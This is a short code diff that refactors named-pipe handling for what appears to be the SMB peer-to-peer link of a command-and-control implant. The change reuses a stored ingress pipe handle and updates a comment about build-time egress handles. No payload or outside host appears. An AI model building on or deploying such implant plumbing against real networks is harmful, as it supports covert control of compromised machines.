@@ -361,15 +361,20 @@ namespace Smb {
         ULONG peer_id       = 0;
         ULONG n_bytes       = 0;
 
-        SmbContextInit(&smb_attr, &sec_attr);
-        if (!(handle = Ctx->win32.CreateNamedPipeW(Ctx->config.IngressPipename, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr))) {
-            return_defer(ntstatus);
+        // save the handle
+        if (!Ctx->config.IngressHandle) {
+            SmbContextInit(&smb_attr, &sec_attr);
+            if (!(handle = Ctx->win32.CreateNamedPipeW(Ctx->config.IngressPipename, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr))) {
+                return_defer(ntstatus);
+            }
+
+            SmbContextDestroy(&smb_attr);
+            if (!Ctx->win32.ConnectNamedPipe(handle, nullptr)) {
+                return_defer(ntstatus);
+            }
         }
 
-        SmbContextDestroy(&smb_attr);
-        if (
-            !Ctx->win32.ConnectNamedPipe(handle, nullptr)||
-            !Ctx->win32.PeekNamedPipe(handle, nullptr, 0, nullptr, &n_bytes, nullptr)) {
+        if (!Ctx->win32.PeekNamedPipe(handle, nullptr, 0, nullptr, &n_bytes, nullptr)) {
             return_defer(ntstatus);
         }
 
@@ -403,7 +408,8 @@ namespace Smb {
 
     VOID PeerConnectEgress(_stream *out, _stream **in) {
         HEXANE
-        // egress handle is set up by the parent. this indicates that we are an smb peer.
+        // egress handle is set up by the parent and is assigned to us at build time.
+        // this indicates that we are an smb peer.
 
         auto pipename = Ctx->config.EgressPipename;
 
